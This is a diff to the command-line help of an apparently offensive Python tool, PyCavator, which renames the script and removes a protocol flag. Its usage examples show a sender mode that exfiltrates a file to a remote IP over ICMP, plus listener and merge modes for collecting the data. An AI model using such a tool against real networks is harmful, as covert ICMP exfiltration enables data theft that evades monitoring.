@@ -219,16 +219,16 @@ def main():
         description='Send and receive data using ICMP packets.',
         epilog='''Examples:
   # Sender mode: exfiltrate data from a file
-  python PyCavator.py -f input.txt -d 192.168.1.101 -p icmp
+  python pycavator-icmp.py -f input.txt -d 192.168.1.101
   
   # Listener mode: listen for incoming data and save in chunks
-  python PyCavator.py -l -s 192.168.1.100 -p icmp -w c
+  python pycavator-icmp.py -l -s 192.168.1.100 -w c
   
   # Listener mode: listen for incoming data and save to a single file
-  python PyCavator.py -l -s 192.168.1.100 -p icmp -w s -o output_folder
+  python pycavator-icmp.py -l -s 192.168.1.100 -w s -o output_folder
   
   # Merge mode: merge output files with part numbers in the specified range
-  python PyCavator.py --merge -x output -a 1 -b 10 -e txt -o output_folder
+  python pycavator-icmp.py --merge -x output -a 1 -b 10 -e txt -o output_folder
         ''',
         formatter_class=argparse.RawTextHelpFormatter
     )
@@ -237,7 +237,6 @@ def main():
     parser.add_argument('-f', '--input_file', metavar='FILE', help='input file to exfiltrate (required in sender mode)')
     parser.add_argument('-d', '--dst_addr', metavar='ADDRESS', help='destination IP address (required in sender mode)')
     parser.add_argument('-s', '--src_addr', metavar='ADDRESS', help='source IP address to listen for (required in listener mode)')
-    parser.add_argument('-p', '--protocol', metavar='PROTOCOL', help='protocol to use (icmp)')
     parser.add_argument('-w', '--write', metavar='WRITE', choices=['c','s'], help='choices to save data (c for chunk OR s to one single file, required in listener mode)')
     parser.add_argument('-o', '--output_folder', metavar='FOLDER', help='output folder for received data (optional in listener mode OR required in merge mode)')
     # Add merge mode arguments
